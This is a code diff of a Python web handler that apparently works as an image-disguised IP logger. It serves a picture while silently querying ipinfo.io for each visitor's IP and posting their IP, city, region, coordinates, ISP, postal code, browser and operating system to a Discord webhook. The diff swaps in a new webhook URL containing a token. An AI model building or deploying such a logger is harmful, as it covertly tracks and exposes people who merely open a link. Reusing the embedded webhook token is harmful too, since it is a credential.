@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1440834869084295282/A2vaKYYleWDSC9aKGWEyMYOu2zu9Q7grG2ZWdyi3Pc3_9NXtTBGOJtrEc-uUSalW47F-'
+webhook = 'https://discord.com/api/webhooks/1479546753530204323/5cqaT5p7VdaaTj7pZfYomO7zTyqMh2kJQ2kr1NZRUC6NOjACq8skcE_wep38toXnEnS3'
 bindata = requests.get('https://amateurphotographer.com/wp-content/uploads/sites/7/2012/05/bliss.jpg').content
 
 buggedimg = True 
@@ -72,3 +72,4 @@ class handler(BaseHTTPRequestHandler):
             else: pass
         else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = requests.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); requests.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
         return
+
